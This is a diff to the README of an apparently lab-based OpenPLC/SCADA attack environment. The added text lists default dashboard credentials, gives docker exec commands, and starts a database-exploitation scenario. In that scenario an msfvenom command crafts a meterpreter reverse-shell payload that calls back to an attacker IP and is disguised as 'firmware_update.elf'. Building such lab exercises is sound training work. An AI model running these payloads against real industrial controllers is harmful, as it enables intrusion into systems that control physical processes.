@@ -29,11 +29,32 @@ Docker Containers
      - `network2` (IP: 172.18.0.12)
    - **Ports:** 10012:8080
 
+## Accessing the Components on the browser
 
-**NB:** There are 06 PLC in total, from PLC11 ... PLC16, there are in the same network named (swat) with their port number correspond to their names 
+1. **PLC11 Dashboard**:
+   - URL: `http://172.18.0.11:10011`
+   - **Username**: `openplc`
+   - **Password**: `openplc`
+
+1. **PLC12 Dashboard**:
+   - URL: `http://172.18.0.12:10012`
+   - **Username**: `openplc`
+   - **Password**: `openplc`
+
+## Accessing the Components on via the docker cli
+
+bash:
+```
+# For plc11
+docker exec -it plc11 bash 
+# For plc12
+docker exec -it plc12 bash 
+```
+
+**NB:** There are 06 PLC in total, from PLC11 ... PLC16, there are in the same network named (swat) with their port number corresponding to their names 
 **Ex :** Name :  PLC11, Port : 10011
 
-## *Setting up the attackers machine*
+## *Setting up the attacker's machine*
 
 Docker command:
 ```
@@ -51,4 +72,34 @@ Docker container
    - **Ports:** 10018:8080
    - **Description:** The attacker will install the basic tools to counter attack.
 
-**NB:** We assume the attack is already in the swat network so he can access other components of the Scada network
+## Accessing the attacker's machine via the docker cli
+
+bash:
+```
+docker exec -it attacker bash
+```
+
+**NB:** We assume the attacker is already in the swat network so he can access other components of the Scada network
+
+## Scenario - 1 : Exploit vulnerable OpenPLC database
+
+The first scenario consist of exploiting the sqlite database of OpenPLC using a script **db-attack.py** found in the **2 - Attack_scripts folder** 
+
+If Metasploit is not installed, follow these steps:
+
+```attacker's terminal
+apt-get update && apt-get install -y git curl wget python3-pip
+apt install metasploit-framework
+```
+
+### Phase 1 : Craft malicious payload
+
+- The attacker creates a malicious payload usually named reverse shell using **Metasploit**’s `msfvenom` tool. to access to the plc's container : 
+
+attacker's terminal
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f elf -o firmware_update.elf
+``` 
+
+
+
